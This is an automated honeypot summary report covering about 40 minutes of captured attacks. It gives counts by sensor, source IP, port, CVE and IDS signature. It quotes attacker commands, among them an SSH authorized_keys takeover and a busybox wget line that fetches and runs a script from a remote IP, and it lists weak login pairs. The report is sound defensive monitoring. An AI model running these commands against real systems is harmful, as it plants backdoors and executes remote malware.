**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-06T11:01:38Z
**Timeframe:** 2025-10-06T10:20:01Z to 2025-10-06T11:00:01Z
**Files Used:** `agg_log_20251006T102001Z.json`, `agg_log_20251006T104001Z.json`, `agg_log_20251006T110001Z.json`

**Executive Summary**

This report summarizes 23,882 attacks recorded by honeypot sensors over a period of approximately 40 minutes. The majority of attacks were captured by the Dionaea, Cowrie, and Suricata honeypots. The most targeted ports were 445 (SMB) and 22 (SSH). A significant portion of the attacks originated from the IP address 120.55.160.161. The most common CVEs exploited were related to Log4j (CVE-2021-44228). Attackers attempted to run various commands, including reconnaissance and attempts to modify SSH authorized keys.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Dionaea: 8482
    *   Cowrie: 7076
    *   Suricata: 3911
    *   Honeytrap: 1769
    *   Ciscoasa: 1266
    *   Mailoney: 878
    *   Sentrypeer: 352
    *   Adbhoney: 20
    *   H0neytr4p: 43
    *   Tanner: 18
    *   ConPot: 11
    *   Redishoneypot: 10
    *   Honeyaml: 16
    *   ElasticPot: 6
    *   Ipphoney: 2
    *   Miniprint: 18
    *   Dicompot: 2
*   **Top Attacking IPs:**
    *   120.55.160.161: 8038
    *   129.212.186.253: 2150
    *   37.55.41.80: 1314
    *   118.96.202.106: 1452
    *   170.64.159.245: 1439
    *   176.65.141.117: 820
    *   85.185.112.6: 390
    *   40.82.137.99: 324
    *   172.86.95.98: 335
    *   188.166.169.185: 187
*   **Top Targeted Ports/Protocols:**
    *   445: 8453
    *   TCP/445: 2760
    *   22: 1195
    *   25: 878
    *   5060: 352
    *   23: 89
    *   8333: 97
    *   5903: 101
    *   5902: 99
    *   TCP/5432: 35
*   **Most Common CVEs:**
    *   CVE-2021-44228: 28
    *   CVE-2018-14847: 4
    *   CVE-2019-11500: 4
    *   CVE-2021-3449: 3
    *   CVE-2002-0013, CVE-2002-0012: 3
    *   CVE-2021-35394: 2
    *   CVE-2002-0013, CVE-2002-0012, CVE-1999-0517: 2
    *   CVE-1999-0183: 1
*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `Enter new UNIX password:`
    *   `uname -m`
    *   `w`
    *   `crontab -l`
    *   `tftp; wget; /bin/busybox VCGIR`
    *   `cd /data/local/tmp/; busybox wget http://46.62.201.208/w.sh; sh w.sh; ...`
*   **Signatures Triggered:**
    *   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 2753
    *   2024766: 2753
    *   ET DROP Dshield Block Listed Source group 1: 367
    *   2402000: 367
    *   ET SCAN NMAP -sS window 1024: 128
    *   2009582: 128
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port: 86
    *   2023753: 86
    *   ET INFO Reserved Internal IP Traffic: 57
    *   2002752: 57
*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34: 14
    *   postgres/postgres: 3
    *   admin/apichart: 3
    *   admin/read123: 3
    *   admin/ashok123: 3
    *   admin/Australia@123: 3
    *   lamination/lamination123: 2
    *   presto/3245gs5662d34: 2
    *   worker/worker123: 2
    *   jack/jack: 2
*   **Files Uploaded/Downloaded:**
    *   wget.sh;: 8
    *   Labello.mpsl;: 3
    *   w.sh;: 2
    *   c.sh;: 2
    *   11: 1
    *   fonts.gstatic.com: 1
    *   css?family=Libre+Franklin...: 1
    *   ie8.css?ver=1.0: 1
    *   html5.js?ver=3.7.3: 1
*   **HTTP User-Agents:**
    *   None observed.
*   **SSH Clients and Servers:**
    *   None observed.
*   **Top Attacker AS Organizations:**
    *   None observed.

**Key Observations and Anomalies**

*   A large number of attacks are attributed to a single IP address (120.55.160.161), primarily targeting port 445.
*   The high number of "DoublePulsar Backdoor" signatures suggests that many of the attacks are automated and part of a larger botnet.
*   The commands attempted by attackers indicate a focus on taking control of the system by adding their own SSH keys and gathering system information.
*   The presence of Log4j CVEs shows that attackers are still actively exploiting this vulnerability.
*   Attackers are using `wget` and `curl` to download and execute malicious scripts.

This concludes the Honeypot Attack Summary Report.
